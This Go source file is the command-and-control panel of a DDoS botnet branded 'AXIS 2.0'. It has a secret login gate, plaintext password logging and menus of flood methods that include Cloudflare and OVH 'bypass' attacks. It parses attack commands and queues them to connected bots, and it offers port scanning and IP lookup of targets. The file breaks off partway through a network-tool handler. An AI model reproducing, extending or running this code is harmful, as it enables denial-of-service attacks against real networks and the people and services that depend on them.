package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get secret (anti-crash)
	this.conn.SetDeadline(time.Now().Add(60 * time.Second))
	this.conn.Write([]byte("\x1b[1;30m"))
	secret, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// anti crash
	if len(secret) > 20 {
		return
	}

	if secret != "AXIS20" {
		return
	}

	// Get username
	this.conn.Write([]byte(fmt.Sprintf("\033]0;AXIS 2.0 Login Screen | 5 Seconds To Login\007")))
	this.conn.SetDeadline(time.Now().Add(5 * time.Second))
	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
	this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
	this.conn.Write([]byte("\x1b[1;32m  go on and nuke your first victim\r\n"))
	this.conn.Write([]byte("\x1b[1;35mUsername\x1b[1;35m: \x1b[0m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(7 * time.Second))
	this.conn.Write([]byte("\033[01;37mPassword\033[01;36m:\033[01;37m \033[1;33m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(120 * time.Second))
	this.conn.Write([]byte("\r\n"))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		this.conn.Write(append([]byte("\r\033[01;37mChecking your information\033[01;36m.\033[01;37m \033[01;37mPlease wait\033[01;36m...\033[01;37m \033[01;36m"), spinBuf[i % len(spinBuf)]))
		time.Sleep(time.Duration(300) * time.Millisecond)
	}
	this.conn.Write([]byte("\r\n"))

	//if credentials are incorrect output error and close session
	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
		this.conn.Write([]byte("\r\033[00;31mInvalid Credentials! \033[01;37mAXIS will be on your way soon!\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		usernameFormat := "username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}

	this.conn.Write([]byte("\033[2J\033[1H"))
	this.conn.Write([]byte("\033[01;37mWelcome user\033[01;36m:\033[01;37m " + username + "\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                               ╔═╗═╗ ╦╦╔═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                               ╠═╣╔╩╦╝║╚═╗\r\n"))
	this.conn.Write([]byte("\x1b[1;36m                               ╩ ╩╩ ╚═╩╚═╝\r\n"))
	this.conn.Write([]byte("\x1b[1;35m                     AXIS 2.0 DDoS from AXIS group\r\n"))
	this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
	this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mWelcome to \033[01;36mAXIS\033[1;37m!                   \033[01;36m┃\r\n"))
	this.conn.Write([]byte("\033[01;36m              ┃ \033[01;31mREAD the FUCKING RULES too buddy   \033[01;36m┃\r\n"))
	this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mType \033[1;33mHELP\033[1;37m to see commands          \033[01;36m┃\r\n"))
	this.conn.Write([]byte("\033[01;36m              ┃ \033[01;32mEstablished connection to \033[01;36mAXIS\033[01;32m!      \033[01;36m┃\r\n"))
	this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
	this.conn.Write([]byte("\r\n"))

	// Start window title updater
	go func() {
		i := 0
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			time.Sleep(time.Second)
			if userInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;AXIS 2.0 | Devices: %d | Ongoing: %d/5 | Admins: %d | Users: %d | Attacks: %d\007", BotCount, database.runningatk(), database.totalAdmins(), database.totalUsers(), database.fetchAttacks()))); err != nil {
					this.conn.Close()
					break
				}
			}
			if userInfo.admin == 0 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;AXIS 2.0 | Devices: %d | Ongoing: %d/5\007", BotCount, database.runningatk()))); err != nil {
					this.conn.Close()
					break
				}
			}
			i++
			if i % 60 == 0 {
				this.conn.SetDeadline(time.Now().Add(120 * time.Second))
			}
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[01;36m╔═\033[01;37m" + username + "@\033[01;36mAXIS\033[01;37mNet\033[01;36m══\033[1;33m$\r\n"))
		this.conn.Write([]byte("\033[01;36m╚═\033[1;33m➢ "))
		cmd, err := this.ReadLine(false)
		if err != nil || cmd == "exit" || cmd == "EXIT" || cmd == "QUIT" || cmd == "quit" {
			return
		}
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "CLS" || cmd == "CLEAR" || cmd == "C" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m                   ╚═╦════════════════════════════════════╦═╝      \r\n"))
			this.conn.Write([]byte("\033[01;36m                     ║\033[1;37m - - - - Welcome to \033[01;36mAXIS\033[1;37m! - - - - \033[01;36m║        \r\n"))
			this.conn.Write([]byte("\033[01;36m                     ║\033[1;37m \033[01;31mREAD\033[1;37m them \033[01;31mFUCKING\033[1;37m \033[1;33mRULES\033[1;37m too buddy\033[01;36m> \033[01;36m║        \r\n"))
			this.conn.Write([]byte("\033[01;36m                 ╚══╦╩════════════════════════════════════╩╦══╝    \r\n"))
			this.conn.Write([]byte("\033[01;36m             ╚╦═════╩══════════════════════════════════════╩═════╦╝\r\n"))
			this.conn.Write([]byte("\033[01;36m              ║\033[1;37m- - -Type \033[1;33mHELP\033[1;37m to see the command list- - -\033[01;36m║ \r\n"))
			this.conn.Write([]byte("\033[01;36m              ║\033[1;37m- - You have \033[01;32mEstablished\033[1;37m connection to \033[01;36mAXIS\033[1;37m! - -\033[01;36m║ \r\n"))
			this.conn.Write([]byte("\033[01;36m              ╚══════════════════════════════════════════════════╝ \r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}
		if cmd == "help" || cmd == "HELP" || cmd == "cmd" || cmd == "CMD" || cmd == "cmds" || cmd == "CMDS" || cmd == "?" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mMETHODS\x1b[1;37m  - Shows all attack methods  \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mBYPASS\x1b[1;37m   - Shows bypass methods       \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mPORTS\x1b[1;37m    - Shows common ports         \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mRULES\x1b[1;37m    - Read the rules             \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mADMIN\x1b[1;37m    - Admin menu                 \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mTOOLS\x1b[1;37m    - Network tools              \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mCLEAR\x1b[1;37m    - Clear screen               \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		// Admin command
		if userInfo.admin == 1 && (cmd == "ADMIN" || cmd == "admin") {
			this.conn.Write([]byte(" \033[01;36m╔═══════════════════════════════════╗\r\n"))
			this.conn.Write([]byte(" \033[01;36m║ \033[1;33mADDUSER  \033[01;36m->\033[1;37m Add Basic client menu  \033[01;36m║\r\n"))
			this.conn.Write([]byte(" \033[01;36m║ \033[1;33mADDADMIN \033[01;36m->\033[1;37m Add Admin client menu  \033[01;36m║\r\n"))
			this.conn.Write([]byte(" \033[01;36m║ \033[1;33mDELUSER  \033[01;36m->\033[1;37m Remove client menu     \033[01;36m║\r\n"))
			this.conn.Write([]byte(" \033[01;36m╚═══════════════════════════════════╝\r\n"))
			continue
		}

		// Methods command
		if cmd == "METHODS" || cmd == "methods" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mLAYER 4\x1b[1;36m ┃\033[1;37m tcp syn ack stomp hex tcpall    \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37m       \x1b[1;36m ┃\033[1;37m tcpfrag asyn usyn ackerpps      \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mLAYER 3\x1b[1;36m ┃\033[1;37m udp udpplain std nudp udphex      \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37m       \x1b[1;36m ┃\033[1;37m vse dns greip greeth randhex     \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mLAYER 7\x1b[1;36m ┃\033[1;37m http https cf nfo               \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mSPECIAL\x1b[1;36m ┃\033[1;37m ovh ovhudp ovhdrop tcpbypass     \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37m       \x1b[1;36m ┃\033[1;37m nfolag ovhnuke stomp raw          \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
			this.conn.Write([]byte("\033[01;36m              \033[1;32mEXAMPLE:\033[1;37m udp \033[1;31mIP TIME \033[1;33mdport=\033[1;31mPORT\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		// Bypass command
		if cmd == "bypass" || cmd == "BYPASS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mcf\x1b[1;37m [IP] [TIME] domain=[DOMAIN]       \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mnfolag\x1b[1;37m [IP] [TIME] dport=[PORT]      \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movhnuke\x1b[1;37m [IP] [TIME] dport=[PORT]    \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movh\x1b[1;37m [IP] [TIME] dport=[PORT]        \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movhudp\x1b[1;37m [IP] [TIME] dport=[PORT]     \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33movhdrop\x1b[1;37m [IP] [TIME] dport=[PORT]    \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mnfo\x1b[1;37m [IP] [TIME] dport=[PORT]        \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mtcpbypass\x1b[1;37m [IP] [TIME] dport=[PORT]  \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33mstomp\x1b[1;37m [IP] [TIME] dport=[PORT]      \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
			this.conn.Write([]byte("\033[01;36m              \033[1;32mEXAMPLE:\033[1;37m cf \033[1;31mIP TIME \033[1;33mdomain=\033[1;31mexample.com\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		// Ports command
		if cmd == "PORTS" || cmd == "ports" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m21\x1b[1;37m=FTP   \033[1;33m22\x1b[1;37m=SSH   \033[1;33m23\x1b[1;37m=TELNET  \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m25\x1b[1;37m=SMTP  \033[1;33m53\x1b[1;37m=DNS   \033[1;33m80\x1b[1;37m=HTTP    \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m443\x1b[1;37m=HTTPS \033[1;33m995\x1b[1;37m=OVH  \033[1;33m3074\x1b[1;37m=XBOX    \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m5060\x1b[1;37m=RTP  \033[1;33m9307\x1b[1;37m=PS4/PS5          \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		// Rules/Info command
		if cmd == "RULES" || cmd == "rules" || cmd == "INFO" || cmd == "info" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;31m- Dont spam attacks!              \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;31m- Dont share logins!              \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;31m- Dont attack governments!        \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mVersion: \033[1;33mv2.0                  \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;37mMade by: \033[1;33mAXIS Group            \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		// TOOLS command
		if cmd == "TOOLS" || cmd == "tools" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╔═╗═╗ ╦╦╔═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;35m             ╠═╣╔╩╦╝║╚═╗\r\n"))
			this.conn.Write([]byte("\x1b[1;36m             ╩ ╩╩ ╚═╩╚═╝\r\n"))
			this.conn.Write([]byte("\x1b[1;35m    AXIS 2.0 DDoS from AXIS group\r\n"))
			this.conn.Write([]byte("\033[01;36m              ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/iplookup\x1b[1;37m    - Lookup IPv4 info      \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/portscan\x1b[1;37m    - Portscan an IP        \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/whois\x1b[1;37m       - WHOIS lookup          \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/ping\x1b[1;37m        - Ping an IP            \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/traceroute\x1b[1;37m  - Trace route to host   \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┃ \033[1;33m/resolve\x1b[1;37m     - Resolve hostname      \033[01;36m┃\r\n"))
			this.conn.Write([]byte("\033[01;36m              ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		// ONGOING command
		if cmd == "ongoing" || cmd == "ong" || cmd == "ONG" || cmd == "LASTONG" || cmd == "lastong" || cmd == "LONG" || cmd == "LASTONGOING" || cmd == "lastongoing" || cmd == "LONGOING" || cmd == "longoing" || cmd == "long" || cmd == "ONGOING" {
			this.conn.Write([]byte("\033[01;36m ╔════════════════════════════════════════════════╗\r\n"))
			this.conn.Write([]byte("\033[01;36m ║\033[1;37mID     COMMAND                 DURATION     BOTS\033[01;36m║\r\n"))
			this.conn.Write([]byte("\033[01;36m ╚════════════════════════════════════════════════╝\r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[01;32m  %d     %s   %d   %d\r\n", database.ongoingIds(), database.ongoingCommands(), database.ongoingDuration(), database.ongoingBots())))
			continue
		}

		// Log command
		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			log.SetOutput(output)
			log.Printf("| username:%s | command:%s | ip:%s", username, cmd, this.conn.RemoteAddr())
		}

		// Handle bot count prefix
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31mFailed to parse botcount \"%s\"\x1b[0m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte("\x1b[1;31mBot count exceeds your limit\x1b[0m\r\n"))
				continue
			}
			cmd = countSplit[1]
		} else {
			botCount = userInfo.maxBots
		}

		// Handle bot category prefix
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		// Parse and launch attack
		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[0m\r\n", err.Error())))
			} else {
				if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\x1b[1;31m%s\x1b[0m\r\n", err.Error())))
				} else if !database.ContainsWhitelistedTargets(atk) {
					clientList.QueueBuf(buf, botCount, botCatagory)
					this.conn.Write([]byte("\x1b[1;32mAttack launched successfully!\x1b[0m\r\n"))
				} else {
					this.conn.Write([]byte("\x1b[1;31mTarget is whitelisted!\x1b[0m\r\n"))
				}
			}
		}

		// Admin commands
		if userInfo.admin == 1 {
			if cmd == "adduser" || cmd == "adduser" {
				this.handleAddUser(false)
				continue
			}
			if cmd == "addadmin" || cmd == "addadmin" {
				this.handleAddUser(true)
				continue
			}
			if cmd == "deluser" || cmd == "deluser" {
				this.handleRemoveUser()
				continue
			}
		}

		// Network tools - zinnet style
		if cmd == "IPLOOKUP" || cmd == "iplookup" {
			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "http://ip-api.com/line/" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address Only!\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "PORTSCAN" || cmd == "portscan" {
			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address/Host Name Only!\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/WHOIS" || cmd == "/whois" {
			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/whois/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/PING" || cmd == "/ping" {
			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/nping/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResponse\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/traceroute" || cmd == "/TRACEROUTE" {
			this.conn.Write([]byte("\033[01;37mIPv4\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 60 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 60 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mError... IP Address/Host Name Only!\033[01;37m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\033[01;37mResults\033[01;36m:\033[01;37m \r\n\033[01;37m" + locformatted + "\033[01;37m\r\n"))
			continue
		}

		if cmd == "/resolve" || cmd == "/RESOLVE" {
			this.conn.Write([]byte("\033[01;37mURL (Without www.)\033[01;36m:\033[01;37m \033[1;33m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 15 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAn Error Occured! Please try again Later.\033[01;37m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
